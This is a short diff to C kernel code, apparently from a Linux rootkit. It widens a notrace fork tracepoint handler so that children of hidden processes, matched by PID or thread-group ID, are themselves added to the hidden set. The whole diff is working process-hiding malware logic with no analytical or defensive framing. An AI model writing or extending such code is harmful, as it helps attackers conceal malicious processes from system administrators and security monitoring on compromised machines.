@@ -9,8 +9,11 @@ static int (*_probe_unregister)(struct tracepoint *, void *, void *);
 
 notrace static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
 {
-    if (is_hidden_pid(parent->pid) || is_child_pid(parent->pid))
-	add_child_pid(child->pid);
+    if (is_hidden_pid(parent->pid) || is_hidden_pid(parent->tgid) ||
+        is_child_pid(parent->pid) || is_child_pid(parent->tgid)) {
+        add_child_pid(child->pid);
+        add_child_pid(child->tgid);
+    }
 }
 
 notrace int trace_pid_init(void)
